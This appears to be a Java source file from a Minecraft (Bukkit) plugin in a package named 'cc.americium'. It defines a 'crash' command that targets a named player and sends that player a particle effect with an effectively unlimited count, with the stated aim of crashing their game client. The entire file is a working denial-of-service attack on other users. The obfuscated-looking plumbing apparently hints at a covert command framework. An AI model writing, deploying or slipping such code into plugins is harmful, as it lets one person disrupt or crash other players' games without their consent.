package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class Crash implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"crash"};
    }

    @Override
    public String getDescription() {
        return "Crashes a player.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "crash <player>");
            return;
        }

        Player foundPlayer = Bukkit.getPlayer(args[0]);
        if (foundPlayer == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
            return;
        }

        sender.sendMessage(Colors.Prefix + Colors.Success + "Attempting to crash " + foundPlayer.getName() + "...");

        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            foundPlayer.spawnParticle(org.bukkit.Particle.CRIT, foundPlayer.getLocation(), Integer.MAX_VALUE);
            sender.sendMessage(Colors.Prefix + Colors.Success + "Crashed " + foundPlayer.getName() + "!");
        });
    }
}
